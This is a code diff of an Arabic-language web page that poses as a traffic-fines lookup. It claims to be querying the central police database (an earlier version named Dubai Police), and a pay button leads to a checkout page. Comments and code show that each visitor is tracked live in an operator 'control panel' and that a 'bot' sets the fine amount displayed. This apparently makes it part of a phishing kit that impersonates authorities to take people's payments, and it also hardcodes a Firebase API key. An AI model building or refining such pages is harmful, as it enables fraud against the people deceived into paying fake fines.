@@ -1,3 +1,7 @@
+<?php
+// صفحة عرض النتائج - المهندس حسن
+// الكود يعمل بنظام Firebase Firestore بالكامل ومتوافق مع Vercel
+?>
 <!doctype html>
 <html lang="ar" dir="rtl">
 <head>
@@ -14,7 +18,7 @@
     * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
     body { margin: 0; padding: 0; background-color: var(--bg-color); font-family: 'Segoe UI', sans-serif; }
 
-    /* هيدر ثابت */
+    /* هيدر ثابت بتصميم احترافي */
     .header-fixed {
       position: fixed;
       top: 0;
@@ -32,7 +36,7 @@
 
     .container {
       max-width: 480px;
-      margin: 80px auto 0;
+      margin: 90px auto 0;
       padding: 20px 15px;
     }
 
@@ -48,10 +52,10 @@
     /* أنيميشن اللودر */
     .loader-ring {
       display: inline-block;
-      width: 80px;
-      height: 80px;
-      border: 8px solid #f3f3f3;
-      border-top: 8px solid var(--main-green);
+      width: 60px;
+      height: 60px;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid var(--main-green);
       border-radius: 50%;
       animation: spin 1s linear infinite;
       margin-bottom: 20px;
@@ -59,10 +63,10 @@
 
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-    .status-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
+    .status-title { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 10px; }
     .status-msg { color: #666; font-size: 14px; line-height: 1.6; }
 
-    /* كارت النتيجة (مخفي في البداية) */
+    /* كارت النتيجة */
     #resultBox {
       display: none;
       margin-top: 20px;
@@ -70,6 +74,7 @@
       border-radius: 20px;
       padding: 25px;
       border-right: 5px solid var(--main-green);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.08);
     }
 
     .amount-box {
@@ -90,7 +95,9 @@
       font-weight: bold;
       cursor: pointer;
       margin-top: 15px;
+      transition: background 0.3s;
     }
+    .pay-btn:active { transform: scale(0.98); }
   </style>
 </head>
 <body>
@@ -108,49 +115,44 @@
     <div class="loader-ring"></div>
     <div class="status-title">جاري فحص المخالفات</div>
     <div class="status-msg">
-      نحن نقوم الآن بالاتصال بقاعدة بيانات شرطة دبي المركزية لجلب بياناتك الحقيقية.. يرجى الانتظار ولا تقم بإغلاق الصفحة.
+      نحن نقوم الآن بالاتصال بقاعدة بيانات الشرطة المركزية لجلب بياناتك.. يرجى الانتظار ولا تقم بإغلاق الصفحة.
     </div>
   </div>
 
   <div id="resultBox">
     <div style="font-size: 14px; color: #666;">إجمالي مبلغ المخالفات المستحق:</div>
     <div class="amount-box" id="totalAmount">0.00 AED</div>
-    <div id="violationDetails" style="font-size: 13px; color: #444; margin-bottom: 20px;"></div>
+    <div id="violationDetails" style="font-size: 13px; color: #444; margin-bottom: 20px; font-weight: 600;"></div>
     <button class="pay-btn" onclick="window.location.href='checkout.php'">دفع المخالفات الآن</button>
   </div>
 </div>
 
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>
 
 <script>
-    // بيانات Firebase الحقيقية لمشروع jusour-qatar
+    // إعدادات Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
       authDomain: "jusour-qatar.firebaseapp.com",
       projectId: "jusour-qatar",
       storageBucket: "jusour-qatar.appspot.com",
       messagingSenderId: "927435762624",
-      appId: "1:927435762624:web:11d0bf460b62e4af9db625",
-      measurementId: "G-CSRM4QLNR9"
+      appId: "1:927435762624:web:11d0bf460b62e4af9db625"
     };
     
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-    const analytics = firebase.analytics();
 
-    // استرجاع معرف الطلب من الجلسة
     const currentOrderId = sessionStorage.getItem("last_order_id");
 
-    // كود تتبع الزيارات المباشرة للوحة التحكم
+    // تتبع الزائر في لوحة التحكم
     function trackVisit() {
         if (currentOrderId) {
             db.collection("active_visits").doc(currentOrderId).set({
-                page: "violations_view",
-                last_seen: firebase.firestore.FieldValue.serverTimestamp(),
-                order_id: currentOrderId
-            }, { merge: true });
+                page: "عرض المخالفات",
+                last_seen: firebase.firestore.FieldValue.serverTimestamp()
+            }, { merge: true }).catch(e => console.log("Track error:", e));
         }
     }
 
@@ -162,30 +164,34 @@
 
         trackVisit();
 
-        db.collection("orders").doc(currentOrderId)
+        // مراقبة حية للتغيرات من الرادار (لوحة التحكم)
+        const unsubscribe = db.collection("orders").doc(currentOrderId)
           .onSnapshot((doc) => {
             if (doc.exists) {
                 const data = doc.data();
                 
+                // لو الحالة نجاح (البوت حط المبلغ)
                 if (data.status === "completed" || data.status === "success") {
                     document.getElementById("loadingCard").style.display = "none";
                     document.getElementById("resultBox").style.display = "block";
-                    document.getElementById("totalAmount").innerText = (data.total_fines || data.amount || "0.00") + " AED";
-                    document.getElementById("violationDetails").innerText = "تم العثور على مخالفات مسجلة على اللوحة رقم: " + (data.plate_number || data.number || "");
+                    document.getElementById("totalAmount").innerText = (data.amount || data.total_fines || "0.00") + " AED";
+                    document.getElementById("violationDetails").innerText = "تم العثور على مخالفات مسجلة على اللوحة رقم: " + (data.plate_number || "");
                 } 
+                // لو مفيش مخالفات
                 else if (data.status === "no_fines") {
                     document.getElementById("loadingCard").innerHTML = `
                         <div style="color: var(--main-green); font-size: 50px; margin-bottom:15px;">✓</div>
                         <div class="status-title">لا توجد مخالفات</div>
-                        <div class="status-msg">لا توجد مخالفات مرورية مسجلة على هذه اللوحة في الوقت الحالي.</div>
+                        <div class="status-msg">لا توجد مخالفات مرورية مسجلة على هذه اللوحة حالياً.</div>
                         <button class="pay-btn" style="background:#444; margin-top:20px;" onclick="window.location.href='index.php'">رجوع للرئيسية</button>
                     `;
                 }
+                // لو حصل خطأ
                 else if (data.status === "error") {
                     document.getElementById("loadingCard").innerHTML = `
                         <div style="color: #e74c3c; font-size: 50px; margin-bottom:15px;">!</div>
                         <div class="status-title">عذراً، حدث خطأ</div>
-                        <div class="status-msg">لم نتمكن من جلب البيانات حالياً، يرجى المحاولة مرة أخرى لاحقاً.</div>
+                        <div class="status-msg">يرجى مراجعة البيانات والمحاولة لاحقاً.</div>
                         <button class="pay-btn" style="background:#444; margin-top:20px;" onclick="window.location.href='index.php'">رجوع</button>
                     `;
                 }
